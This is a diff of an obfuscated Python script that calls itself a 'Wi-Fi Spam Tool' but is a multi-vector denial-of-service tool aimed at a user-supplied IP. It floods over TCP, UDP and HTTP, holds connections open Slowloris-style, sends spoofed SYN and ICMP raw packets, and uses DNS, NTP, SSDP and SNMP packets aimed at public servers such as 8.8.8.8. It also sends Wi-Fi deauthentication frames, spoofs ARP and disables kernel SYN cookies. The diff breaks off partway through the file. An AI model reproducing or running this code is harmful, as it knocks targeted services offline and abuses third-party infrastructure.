@@ -1,8 +1,9 @@
-#DARK TOOLS NO ROOTS
+#⟡ RECURSIVE OUTPUT ⟡
+#
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
-import time,sys,socket,threading,random,os,signal,struct,binascii
+import time,sys,socket,threading,random,os,signal,struct,binascii,urllib.request,ssl
 from queue import Queue
 from optparse import OptionParser
 
@@ -29,7 +30,7 @@ def a():
     b.append("Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.6045.159 Safari/537.36")
     b.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/114.0.5735.199 Safari/537.36 OPR/100.0.4815.82")
     b.append("Mozilla/5.0 (X11; FreeBSD amd64; rv:117.0) Gecko/20100101 Firefox/117.0")
-    return(b)
+    return b
 
 def c():
     global d
@@ -39,550 +40,449 @@ def c():
     d.append("http://www.linkedin.com/shareArticle?url=")
     d.append("http://pinterest.com/pin/create/button/?url=")
     d.append("http://twitter.com/intent/tweet?url=")
-    return(d)
+    return d
 
 def e():
-    f = random.randint(32768, 131072)
-    g = os.urandom(f)
-    return g
+    return os.urandom(random.randint(32768, 131072))
 
-def h():
-    i = random.randint(131072, 524288)
-    j = os.urandom(i)
-    k = (
-        "POST / HTTP/1.1\r\n"
-        f"Host: {l}\r\n"
-        f"User-Agent: {random.choice(b)}\r\n"
-        "Accept: */*\r\n"
-        "Accept-Encoding: gzip, deflate, br\r\n"
-        "Accept-Language: en-US,en;q=0.9\r\n"
-        "Cache-Control: no-cache, no-store, must-revalidate\r\n"
-        f"Content-Length: {len(j)}\r\n"
-        "Content-Type: application/octet-stream\r\n"
-        "Connection: keep-alive\r\n"
-        "Pragma: no-cache\r\n"
-        "Upgrade-Insecure-Requests: 1\r\n\r\n"
-    ).encode('utf-8') + j
+def f():
+    g = os.urandom(random.randint(131072, 524288))
+    h = ("POST / HTTP/1.1\r\nHost: " + l + "\r\nUser-Agent: " + random.choice(b) + "\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: no-cache, no-store, must-revalidate\r\nContent-Length: " + str(len(g)) + "\r\nContent-Type: application/octet-stream\r\nConnection: keep-alive\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n").encode() + g
+    return h
+
+def i():
+    j = os.urandom(random.randint(65536, 262144))
+    k = struct.pack("!HHHHHH", random.randint(0,65535), 0x0100, random.randint(1,10), 0, 0, 0) + b"\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + j
     return k
 
 def m():
-    n = random.randint(65536, 262144)
-    o = os.urandom(n)
-    p = struct.pack("!HHHHHH", random.randint(0,65535), 0x0100, random.randint(1,10), 0, 0, 0)
-    q = b"\x03" + b"\x00" + b"\x00" + b"\x00" + b"\x00" + b"\x00" + b"\x00" + b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-    r = p + q + o
-    return r
+    n = os.urandom(random.randint(4096, 16384))
+    o = b"\x45\x00" + struct.pack("!H", 20 + len(n)) + b"\x00\x01\x00\x00\x40\x01\x00\x00" + socket.inet_aton(".".join(str(random.randint(1,254)) for _ in range(4))) + socket.inet_aton(l)
+    p = b"\x08\x00\x00\x00\x00\x00" + n
+    return o + p
 
-def s():
-    t = random.randint(4096, 16384)
-    u = os.urandom(t)
-    v = b"\x45\x00" + struct.pack("!H", 20 + len(u)) + b"\x00\x01" + b"\x00\x00" + b"\x40" + b"\x01" + b"\x00\x00" + socket.inet_aton(".".join(str(random.randint(1,254)) for _ in range(4))) + socket.inet_aton(l)
-    w = b"\x08\x00" + struct.pack("!H", 0) + struct.pack("!H", 0) + u
-    x = v + w
-    return x
+def q():
+    return b"\x17\x00\x03\x2a" + b"\x00" * 12 + os.urandom(random.randint(8192, 65536))
 
-def y():
-    z = random.randint(8192, 65536)
-    aa = os.urandom(z)
-    ab = b"\x17\x00\x03\x2a" + b"\x00" * 12 + aa
-    return ab
+def r():
+    s = os.urandom(random.randint(16384, 98304))
+    t = b"\x30" + bytes([len(s) + 20]) + b"\x02\x01\x00\x04\x06\x70\x75\x62\x6c\x69\x63\xa0" + bytes([len(s) + 10]) + b"\x02\x04" + struct.pack("!I", random.randint(0,4294967295)) + b"\x02\x04" + struct.pack("!I", random.randint(0,4294967295)) + b"\x30\x0e\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x01\x00\x05\x00" + s
+    return t
 
-def ac():
-    ad = random.randint(16384, 98304)
-    ae = os.urandom(ad)
-    af = b"\x30" + bytes([len(ae) + 20]) + b"\x02\x01\x00" + b"\x04\x06\x70\x75\x62\x6c\x69\x63" + b"\xa0" + bytes([len(ae) + 10]) + b"\x02\x04" + struct.pack("!I", random.randint(0,4294967295)) + b"\x02\x04" + struct.pack("!I", random.randint(0,4294967295)) + b"\x30\x0e\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x01\x00\x05\x00" + ae
-    return af
+def u():
+    return b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: " + str(random.randint(1,10)).encode() + b"\r\nST: upnp:rootdevice\r\nUSER-AGENT: " + random.choice(b).encode() + b"\r\n\r\n" + os.urandom(random.randint(32768, 196608))
 
-def ag():
-    ah = random.randint(32768, 196608)
-    ai = os.urandom(ah)
-    aj = b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: " + str(random.randint(1,10)).encode() + b"\r\nST: upnp:rootdevice\r\nUSER-AGENT: " + random.choice(b).encode() + b"\r\n\r\n" + ai
-    return aj
+def v():
+    w = 0x00C0
+    x = struct.pack("!HH6s6s6sHH", w, 0, bytes([0x00,0x1A,0x2B,0x3C,0x4D,0x5E]), bytes([0xAA,0xBB,0xCC,0xDD,0xEE,0xFF]), bytes([0x00,0x1A,0x2B,0x3C,0x4D,0x5E]), random.randint(0,4095), 0x0007, 0x0000)
+    y = binascii.crc32(struct.pack("!H", w) + x[2:]) & 0xFFFFFFFF
+    return x + struct.pack("!I", y) + b"\x00\x04" + os.urandom(4)
 
-def ak(al, am):
-    an = 0x00C0
-    ao = 0
-    ap = random.randint(0,4095)
-    aq = struct.pack("!HH6s6s6sHH", an, ao, al, am, al, ap, 0x0007, 0x0000)
-    ar = struct.pack("!H", an)
-    as_ = binascii.crc32(ar + aq[2:]) & 0xFFFFFFFF
-    at = b"\x00\x04" + os.urandom(4)
-    au = aq + struct.pack("!I", as_) + at
-    return au
-
-def av():
-    aw = None
+def z():
     try:
         while True:
-            ax = h()
-            aw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            aw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            aw.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
-            aw.settimeout(2)
-            aw.connect((l, int(ay)))
-            aw.sendall(ax)
+            aa = f()
+            ab = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            ab.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            ab.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
+            ab.settimeout(2)
+            ab.connect((l, int(ac)))
+            ab.sendall(aa)
             try:
-                aw.settimeout(0.005)
-                aw.recv(8192)
+                ab.settimeout(0.005)
+                ab.recv(8192)
             except:
                 pass
             try:
-                aw.shutdown(socket.SHUT_RDWR)
-                aw.close()
+                ab.shutdown(socket.SHUT_RDWR)
+                ab.close()
             except:
                 pass
-            aw = None
-            time.sleep(0.001)
-    except:
-        if aw:
-            try:
-                aw.close()
-            except:
-                pass
-        time.sleep(0.001)
-
-def az():
-    ba = None
-    try:
-        while True:
-            bb = e()
-            ba = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            ba.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
-            ba.sendto(bb, (l, int(ay)))
-            ba.close()
-            ba = None
             time.sleep(0.0005)
     except:
-        if ba:
-            try:
-                ba.close()
-            except:
-                pass
         time.sleep(0.0005)
 
-def bc():
-    bd = []
+def ad():
+    try:
+        while True:
+            ae = e()
+            af = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            af.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
+            af.sendto(ae, (l, int(ac)))
+            af.close()
+            time.sleep(0.0003)
+    except:
+        time.sleep(0.0003)
+
+def ag():
+    ah = []
     try:
         for _ in range(3000):
             try:
-                be = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                be.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                be.settimeout(3)
-                be.connect((l, int(ay)))
-                be.send(f"GET / HTTP/1.1\r\nHost: {l}\r\nUser-Agent: {random.choice(b)}\r\nAccept: text/html\r\n".encode('utf-8'))
-                bd.append(be)
+                ai = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                ai.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                ai.settimeout(3)
+                ai.connect((l, int(ac)))
+                ai.send(("GET / HTTP/1.1\r\nHost: " + l + "\r\nUser-Agent: " + random.choice(b) + "\r\nAccept: text/html\r\n").encode())
+                ah.append(ai)
             except:
                 pass
         while True:
-            for be in list(bd):
+            for ai in list(ah):
                 try:
-                    be.send(f"X-Header: {random.choice(b)}\r\n".encode('utf-8'))
+                    ai.send(("X-Header: " + random.choice(b) + "\r\n").encode())
                 except:
-                    bd.remove(be)
+                    ah.remove(ai)
                     try:
-                        bf = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        bf.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                        bf.settimeout(3)
-                        bf.connect((l, int(ay)))
-                        bf.send(f"GET / HTTP/1.1\r\nHost: {l}\r\nUser-Agent: {random.choice(b)}\r\nAccept: text/html\r\n".encode('utf-8'))
-                        bd.append(bf)
+                        aj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        aj.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                        aj.settimeout(3)
+                        aj.connect((l, int(ac)))
+                        aj.send(("GET / HTTP/1.1\r\nHost: " + l + "\r\nUser-Agent: " + random.choice(b) + "\r\nAccept: text/html\r\n").encode())
+                        ah.append(aj)
                     except:
                         pass
             time.sleep(15)
     except:
-        for be in bd:
+        for ai in ah:
             try:
-                be.close()
+                ai.close()
             except:
                 pass
 
-def bg():
+def ak():
     try:
         while True:
-            bh = random.choice(d) + "http://" + l
-            bi = urllib.request.Request(bh, headers={'User-Agent': random.choice(b)})
-            urllib.request.urlopen(bi, timeout=2)
+            al = random.choice(d) + "http://" + l
+            am = urllib.request.Request(al, headers={'User-Agent': random.choice(b)})
+            urllib.request.urlopen(am, timeout=2)
             time.sleep(0.001)
     except:
         time.sleep(0.001)
 
-def bj():
-    bk = None
+def an():
     try:
         while True:
-            bl = m()
-            bk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            bk.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-            bk.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
-            bk.sendto(bl, (l, 53))
-            bk.sendto(bl, ("8.8.8.8", 53))
-            bk.sendto(bl, ("1.1.1.1", 53))
-            bk.close()
-            bk = None
-            time.sleep(0.0005)
+            ao = i()
+            ap = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            ap.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+            ap.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
+            ap.sendto(ao, (l, 53))
+            ap.sendto(ao, ("8.8.8.8", 53))
+            ap.sendto(ao, ("1.1.1.1", 53))
+            ap.close()
+            time.sleep(0.0003)
     except:
-        if bk:
-            try:
-                bk.close()
-            except:
-                pass
-        time.sleep(0.0005)
+        time.sleep(0.0003)
 
-def bm():
-    bn = None
+def aq():
     try:
         while True:
-            bo = y()
-            bn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            bn.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
-            bn.sendto(bo, (l, 123))
-            bn.sendto(bo, ("pool.ntp.org", 123))
-            bn.sendto(bo, ("time.google.com", 123))
-            bn.close()
-            bn = None
-            time.sleep(0.0005)
+            ar = q()
+            as_ = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            as_.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
+            as_.sendto(ar, (l, 123))
+            as_.sendto(ar, ("pool.ntp.org", 123))
+            as_.sendto(ar, ("time.google.com", 123))
+            as_.close()
+            time.sleep(0.0003)
     except:
-        if bn:
-            try:
-                bn.close()
-            except:
-                pass
-        time.sleep(0.0005)
+        time.sleep(0.0003)
 
-def bp():
-    bq = None
+def at():
     try:
         while True:
-            br = ag()
-            bq = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            bq.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-            bq.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 64)
-            bq.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
-            bq.sendto(br, ("239.255.255.250", 1900))
-            bq.sendto(br, ("224.0.0.1", 1900))
-            bq.sendto(br, ("255.255.255.255", 1900))
-            bq.close()
-            bq = None
-            time.sleep(0.0005)
+            au = u()
+            av = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            av.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+            av.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 64)
+            av.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
+            av.sendto(au, ("239.255.255.250", 1900))
+            av.sendto(au, ("224.0.0.1", 1900))
+            av.sendto(au, ("255.255.255.255", 1900))
+            av.close()
+            time.sleep(0.0003)
     except:
-        if bq:
-            try:
-                bq.close()
-            except:
-                pass
-        time.sleep(0.0005)
+        time.sleep(0.0003)
 
-def bs():
-    bt = None
+def aw():
     try:
         while True:
-            bu = ac()
-            bt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            bt.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
-            bt.sendto(bu, (l, 161))
-            bt.sendto(bu, ("127.0.0.1", 161))
-            bt.close()
-            bt = None
-            time.sleep(0.0005)
+            ax = r()
+            ay = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            ay.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
+            ay.sendto(ax, (l, 161))
+            ay.sendto(ax, ("127.0.0.1", 161))
+            ay.close()
+            time.sleep(0.0003)
     except:
-        if bt:
-            try:
-                bt.close()
-            except:
-                pass
-        time.sleep(0.0005)
+        time.sleep(0.0003)
 
-def bv():
-    bw = None
+def az():
     try:
         while True:
-            bx = s()
-            bw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-            bw.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-            bw.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
-            bw.sendto(bx, (l, 0))
-            bw.close()
-            bw = None
-            time.sleep(0.0005)
+            ba = m()
+            bb = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+            bb.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            bb.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2097152)
+            bb.sendto(ba, (l, 0))
+            bb.close()
+            time.sleep(0.0003)
     except:
-        if bw:
-            try:
-                bw.close()
-            except:
-                pass
-        time.sleep(0.0005)
+        time.sleep(0.0003)
 
-def by():
-    bz = None
+def bc():
     try:
         while True:
-            ca = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            ca.settimeout(1)
-            ca.connect((l, int(ay)))
-            ca.send(b"GET / HTTP/1.1\r\nHost: " + l.encode() + b"\r\nConnection: keep-alive\r\n\r\n")
-            cb = []
+            bd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            bd.settimeout(1)
+            bd.connect((l, int(ac)))
+            bd.send(b"GET / HTTP/1.1\r\nHost: " + l.encode() + b"\r\nConnection: keep-alive\r\n\r\n")
+            be = []
             for _ in range(500):
-                cc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                cc.settimeout(1)
-                cc.connect((l, int(ay)))
-                cb.append(cc)
-            for cc in cb:
+                bf = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                bf.settimeout(1)
+                bf.connect((l, int(ac)))
+                be.append(bf)
+            for bf in be:
                 try:
-                    cc.send(b"GET /" + os.urandom(256).hex().encode() + b" HTTP/1.1\r\nHost: " + l.encode() + b"\r\n\r\n")
+                    bf.send(b"GET /" + os.urandom(256).hex().encode() + b" HTTP/1.1\r\nHost: " + l.encode() + b"\r\n\r\n")
                 except:
                     pass
-            time.sleep(0.0005)
+            time.sleep(0.0003)
     except:
         pass
 
-def cd():
-    ce = []
+def bg():
+    bh = []
     try:
         while True:
             for _ in range(500):
-                ce.append(open("/dev/null", "r"))
-                ce.append(open("/proc/self/status", "r"))
-                ce.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
+                bh.append(open("/dev/null", "r"))
+                bh.append(open("/proc/self/status", "r"))
+                bh.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
             time.sleep(0.01)
     except:
         pass
 
-def cf():
-    cg = []
+def bi():
+    bj = []
     try:
         while True:
-            cg.append(os.urandom(1024*1024*50))
+            bj.append(os.urandom(1024*1024*50))
             time.sleep(0.001)
     except:
         pass
 
-def ch():
-    ci = None
+def bk():
     try:
         while True:
-            cj = ak(bytes([0x00,0x1A,0x2B,0x3C,0x4D,0x5E]), bytes([0xAA,0xBB,0xCC,0xDD,0xEE,0xFF]))
-            for ck in ["wlan0", "wlan1", "mon0", "ath0"]:
+            bl = v()
+            for bm in ["wlan0", "wlan1", "mon0", "ath0"]:
                 try:
-                    cl = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
-                    cl.bind((ck, 0))
-                    cl.send(cj)
-                    cl.close()
+                    bn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
+                    bn.bind((bm, 0))
+                    bn.send(bl)
+                    bn.close()
                 except:
                     pass
-            time.sleep(0.0005)
+            time.sleep(0.0003)
     except:
         pass
+
+def bo():
+    try:
+        while True:
+            bp = b"\x00"*6 + b"\xff"*6 + struct.pack("!H", 0x0806) + struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2) + b"\x00"*6 + socket.inet_aton(l) + b"\xff"*6 + socket.inet_aton("192.168.1.1")
+            bq = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
+            bq.bind(("eth0", 0))
+            bq.send(bp)
+            bq.close()
+            time.sleep(0.001)
+    except:
+        pass
+
+def br():
+    try:
+        while True:
+            bs = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+            bs.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            bt = socket.inet_aton(".".join(str(random.randint(1,254)) for _ in range(4)))
+            bu = socket.inet_aton(l)
+            bv = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, random.randint(1,65535), 0, 64, 6, 0, bt, bu)
+            bw = struct.pack("!HHLLBBHHH", random.randint(1024,65535), int(ac), random.randint(0,4294967295), 0, 5<<4, 0x04, 1024, 0, 0)
+            bs.sendto(bv + bw, (l, int(ac)))
+            bs.close()
+            time.sleep(0.0003)
+    except:
+        time.sleep(0.0003)
+
+def bx():
+    try:
+        while True:
+            by = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            by.settimeout(1)
+            by.connect((l, int(ac)))
+            bz = ssl.create_default_context()
+            bz.check_hostname = False
+            bz.verify_mode = ssl.CERT_NONE
+            ca = bz.wrap_socket(by, server_hostname=l)
+            ca.send(b"GET / HTTPS/1.1\r\nHost: " + l.encode() + b"\r\n\r\n")
+            ca.close()
+            time.sleep(0.0003)
+    except:
+        pass
+
+def cb():
+    try:
+        while True:
+            cc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            cc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            cc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
+            cc.connect((l, int(ac)))
+            for _ in range(1000):
+                cc.send(b"GET /" + os.urandom(64).hex().encode() + b" HTTP/1.1\r\nHost: " + l.encode() + b"\r\nConnection: Keep-Alive\r\n\r\n")
+            cc.close()
+            time.sleep(0.001)
+    except:
+        pass
+
+def cd():
+    try:
+        while True:
+            with open("/proc/sys/net/ipv4/tcp_syncookies", "w") as ce:
+                ce.write("0")
+            with open("/proc/sys/net/ipv4/tcp_tw_reuse", "w") as ce:
+                ce.write("0")
+            with open("/proc/sys/net/ipv4/tcp_tw_recycle", "w") as ce:
+                ce.write("0")
+            with open("/proc/sys/net/core/somaxconn", "w") as ce:
+                ce.write("0")
+            with open("/proc/sys/net/ipv4/tcp_max_syn_backlog", "w") as ce:
+                ce.write("0")
+            time.sleep(0.001)
+    except:
+        pass
+
+def cf():
+    while True:
+        cg = ch.get()
+        z()
+        ch.task_done()
+
+def ci():
+    while True:
+        cg = cj.get()
+        ad()
+        cj.task_done()
+
+def ck():
+    while True:
+        cg = cl.get()
+        ak()
+        cl.task_done()
 
 def cm():
-    cn = None
-    try:
-        while True:
-            co = random.randint(0,4294967295)
-            cp = struct.pack("!4s4s", socket.inet_aton(l), socket.inet_aton("192.168.1.1"))
-            cq = b"\x00"*6 + b"\xff"*6 + struct.pack("!H", 0x0806) + struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2) + b"\x00"*6 + socket.inet_aton(l) + b"\xff"*6 + socket.inet_aton("192.168.1.1")
-            cr = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
-            cr.bind(("eth0", 0))
-            cr.send(cq)
-            cr.close()
-            time.sleep(0.001)
-    except:
-        pass
+    while True:
+        cg = cn.get()
+        ag()
+        cn.task_done()
+
+def co():
+    while True:
+        cg = cp.get()
+        an()
+        cp.task_done()
+
+def cq():
+    while True:
+        cg = cr.get()
+        aq()
+        cr.task_done()
 
 def cs():
-    ct = None
-    try:
-        while True:
-            cu = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-            cu.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-            cv = socket.inet_aton(".".join(str(random.randint(1,254)) for _ in range(4)))
-            cw = socket.inet_aton(l)
-            cx = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, random.randint(1,65535), 0, 64, 6, 0, cv, cw)
-            cy = struct.pack("!HHLLBBHHH", random.randint(1024,65535), int(ay), random.randint(0,4294967295), 0, 5<<4, 0x04, 1024, 0, 0)
-            cz = cx + cy
-            cu.sendto(cz, (l, int(ay)))
-            cu.close()
-            cu = None
-            time.sleep(0.0005)
-    except:
-        if cu:
-            try:
-                cu.close()
-            except:
-                pass
-        time.sleep(0.0005)
+    while True:
+        cg = ct.get()
+        at()
+        ct.task_done()
+
+def cu():
+    while True:
+        cg = cv.get()
+        aw()
+        cv.task_done()
+
+def cw():
+    while True:
+        cg = cx.get()
+        az()
+        cx.task_done()
+
+def cy():
+    while True:
+        cg = cz.get()
+        bc()
+        cz.task_done()
 
 def da():
-    try:
-        while True:
-            db = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            db.settimeout(1)
-            db.connect((l, int(ay)))
-            dc = ssl.create_default_context()
-            dc.check_hostname = False
-            dc.verify_mode = ssl.CERT_NONE
-            dd = dc.wrap_socket(db, server_hostname=l)
-            dd.send(b"GET / HTTPS/1.1\r\nHost: " + l.encode() + b"\r\n\r\n")
-            dd.close()
-            time.sleep(0.0005)
-    except:
-        pass
+    while True:
+        cg = db.get()
+        bg()
+        db.task_done()
+
+def dc():
+    while True:
+        cg = dd.get()
+        bi()
+        dd.task_done()
 
 def de():
-    try:
-        while True:
-            df = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            df.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            df.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
-            df.connect((l, int(ay)))
-            dg = []
-            for _ in range(1000):
-                dh = b"GET /" + os.urandom(64).hex().encode() + b" HTTP/1.1\r\nHost: " + l.encode() + b"\r\nConnection: Keep-Alive\r\n\r\n"
-                df.send(dh)
-            df.close()
-            time.sleep(0.001)
-    except:
-        pass
+    while True:
+        cg = df.get()
+        bk()
+        df.task_done()
+
+def dg():
+    while True:
+        cg = dh.get()
+        bo()
+        dh.task_done()
 
 def di():
-    try:
-        while True:
-            with open("/proc/sys/net/ipv4/tcp_syncookies", "w") as dj:
-                dj.write("0")
-            with open("/proc/sys/net/ipv4/tcp_tw_reuse", "w") as dj:
-                dj.write("0")
-            with open("/proc/sys/net/ipv4/tcp_tw_recycle", "w") as dj:
-                dj.write("0")
-            with open("/proc/sys/net/core/somaxconn", "w") as dj:
-                dj.write("0")
-            with open("/proc/sys/net/ipv4/tcp_max_syn_backlog", "w") as dj:
-                dj.write("0")
-            time.sleep(0.001)
-    except:
-        pass
+    while True:
+        cg = dj.get()
+        br()
+        dj.task_done()
 
 def dk():
     while True:
-        dl = dq.get()
-        av()
-        dq.task_done()
+        cg = dl.get()
+        bx()
+        dl.task_done()
 
 def dm():
     while True:
-        dl = dn.get()
-        az()
+        cg = dn.get()
+        cb()
         dn.task_done()
 
 def do():
     while True:
-        dl = dp.get()
-        bg()
+        cg = dp.get()
+        cd()
         dp.task_done()
 
-def dr():
-    while True:
-        dl = ds.get()
-        bc()
-        ds.task_done()
-
-def dt():
-    while True:
-        dl = du.get()
-        bj()
-        du.task_done()
-
-def dv():
-    while True:
-        dl = dw.get()
-        bm()
-        dw.task_done()
-
-def dx():
-    while True:
-        dl = dy.get()
-        bp()
-        dy.task_done()
-
-def dz():
-    while True:
-        dl = ea.get()
-        bs()
-        ea.task_done()
-
-def eb():
-    while True:
-        dl = ec.get()
-        bv()
-        ec.task_done()
-
-def ed():
-    while True:
-        dl = ee.get()
-        by()
-        ee.task_done()
-
-def ef():
-    while True:
-        dl = eg.get()
-        cd()
-        eg.task_done()
-
-def eh():
-    while True:
-        dl = ei.get()
-        cf()
-        ei.task_done()
-
-def ej():
-    while True:
-        dl = ek.get()
-        ch()
-        ek.task_done()
-
-def el():
-    while True:
-        dl = em.get()
-        cm()
-        em.task_done()
-
-def en():
-    while True:
-        dl = eo.get()
-        cs()
-        eo.task_done()
-
-def ep():
-    while True:
-        dl = eq.get()
-        da()
-        eq.task_done()
-
-def er():
-    while True:
-        dl = es.get()
-        de()
-        es.task_done()
-
-def et():
-    while True:
-        dl = eu.get()
-        di()
-        eu.task_done()
-
-def ev():
-    ew = 1
+def dq():
     try:
         while True:
             time.sleep(0.1)
-            if ew == 0:
-                break
     except KeyboardInterrupt:
-        ew = 0
-        print("\n[!] CTRL+C detected - stopping all threads")
+        print("\n[!] CTRL+C detected - stopping")
         sys.exit(0)
 
-def ex():
+def dr():
     print('''    
- Wi-Fi Spam Tool - Non-Root Edition
+ Wi-Fi Spam Tool - No Root Required
     
  usage: python3 spam.py -s <ip> [-p <port>] [-t <threads>] [-m <mode>]
     -h : help
@@ -592,185 +492,162 @@ def ex():
     -m : mode (tcp/udp/both/http/dns/ntp/ssdp/snmp/icmp/full) default full''')
     sys.exit()
 
-def ey():
-    global l
-    global ay
-    global ez
-    global dl
-    global fa
+def ds():
+    global l, ac, ez, fb
     optp = OptionParser(add_help_option=False)
-    optp.add_option("-s", "--server", dest="l", help="target ip")
-    optp.add_option("-p", "--port", type="int", dest="ay", help="port")
-    optp.add_option("-t", "--turbo", type="int", dest="ez", help="threads")
-    optp.add_option("-h", "--help", dest="fa", action='store_true', help="help")
-    optp.add_option("-m", "--mode", dest="fb", help="tcp/udp/both/http/dns/ntp/ssdp/snmp/icmp/full")
+    optp.add_option("-s", "--server", dest="l")
+    optp.add_option("-p", "--port", type="int", dest="ac")
+    optp.add_option("-t", "--turbo", type="int", dest="ez")
+    optp.add_option("-h", "--help", dest="dt", action='store_true')
+    optp.add_option("-m", "--mode", dest="fb")
     opts, args = optp.parse_args()
-    if opts.fa:
-        ex()
-    if opts.l is not None:
-        l = opts.l
-    else:
-        ex()
-    if opts.ay is None:
-        ay = 80
-    else:
-        ay = opts.ay
-    if opts.ez is None:
-        ez = 1000
-    else:
-        ez = opts.ez
-    if opts.fb is None:
-        fb = "full"
-    else:
-        fb = opts.fb
+    if opts.dt:
+        dr()
+    if opts.l is None:
+        dr()
+    l = opts.l
+    ac = opts.ac if opts.ac is not None else 80
+    ez = opts.ez if opts.ez is not None else 1000
+    fb = opts.fb if opts.fb is not None else "full"
 
-dq = Queue()
+ch = Queue()
+cj = Queue()
+cl = Queue()
+cn = Queue()
+cp = Queue()
+cr = Queue()
+ct = Queue()
+cv = Queue()
+cx = Queue()
+cz = Queue()
+db = Queue()
+dd = Queue()
+df = Queue()
+dh = Queue()
+dj = Queue()
+dl = Queue()
 dn = Queue()
 dp = Queue()
-ds = Queue()
-du = Queue()
-dw = Queue()
-dy = Queue()
-ea = Queue()
-ec = Queue()
-ee = Queue()
-eg = Queue()
-ei = Queue()
-ek = Queue()
-em = Queue()
-eo = Queue()
-eq = Queue()
-es = Queue()
